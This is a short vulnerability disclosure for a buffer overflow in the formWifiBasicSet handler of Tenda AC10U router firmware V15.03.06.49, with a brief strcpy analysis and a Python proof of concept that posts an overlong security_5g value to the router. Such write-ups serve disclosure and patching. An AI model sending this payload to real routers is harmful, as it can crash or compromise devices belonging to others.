# buffer overflow

## Tenda_AC10U_V1

version: V15.03.06.49

## Description:

There is a buffer overflow in httpd/formWifiBasicSet

## Source:

you may download it from : https://www.tendacn.com/download/detail-3795.html

## Analyse:


![](16.png)

get value from security_5g 

![](17.png)

if we dont send all paremeters, get into else, call strcpy, cause buff overflow



## POC
```
url = "http://192.168.1.13/goform/formWifiBasicSet"
payload = 'A'*300 + '\n'

r = requests.post(url, data={'security_5g': payload})
``` 
